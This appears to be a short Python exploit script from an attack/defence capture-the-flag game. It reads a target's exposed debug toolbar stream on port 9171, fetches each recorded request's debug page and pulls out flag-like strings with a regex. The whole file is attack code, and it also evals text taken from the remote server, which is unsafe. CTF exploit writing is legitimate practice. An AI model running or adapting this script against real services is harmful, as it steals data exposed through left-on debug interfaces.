#!/usr/bin/env python3

import re
import sys

import requests

ip = sys.argv[1]

data = requests.get(f'http://{ip}:9171/_debug_toolbar/sse')
data = eval(data.text.split('\n')[2][5:])
print(data)
ids = list(map(lambda x: x[0], data))
print(ids)

for each in ids:
    r = requests.get(f'http://{ip}:9171/_debug_toolbar/{each}')
    print(re.findall('[A-Z0-9]{31}=', r.text), flush=True)
